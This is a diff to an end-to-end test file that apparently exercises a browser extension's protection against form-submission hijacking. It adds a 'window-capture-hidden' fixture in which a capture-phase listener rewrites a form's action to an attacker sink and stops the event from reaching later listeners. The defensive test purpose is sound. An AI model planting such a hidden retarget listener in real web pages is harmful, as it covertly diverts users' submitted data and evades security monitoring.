@@ -39,6 +39,7 @@ type Retarget =
   | "submit-formaction"
   | "submit-action"
   | "submit-base"
+  | "window-capture-hidden"
   | "submit-formaction-blank"
   | "formdata-action";
 type Sinks = { approved: string[]; attacker: string[]; resumedSubmits: number };
@@ -138,6 +139,19 @@ async function installRetarget(page: Page, mode: Retarget): Promise<void> {
           go.setAttribute("formtarget", "_blank");
         }
       });
+      if (mode === "window-capture-hidden") {
+        // A page window-capture listener: retarget, then hide the event from
+        // every listener after it.
+        window.addEventListener(
+          "submit",
+          (event) => {
+            console.log("fixture:resumed-submit");
+            go.setAttribute("formaction", attacker);
+            event.stopPropagation();
+          },
+          true,
+        );
+      }
       if (mode === "formdata-action") {
         form.addEventListener("formdata", () => {
           form.action = attacker;
@@ -176,7 +190,7 @@ test("silent allow without a retarget still POSTs to the approved destination (c
   });
 });
 
-for (const mode of ["submit-formaction", "submit-action", "submit-base"] as const) {
+for (const mode of ["submit-formaction", "submit-action", "submit-base", "window-capture-hidden"] as const) {
   test(`silent allow: a ${mode} retarget in the resumed submit sends nothing to the attacker (#1084) @regression`, async () => {
     test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
     await withVictimPage(false, async (page, sinks) => {
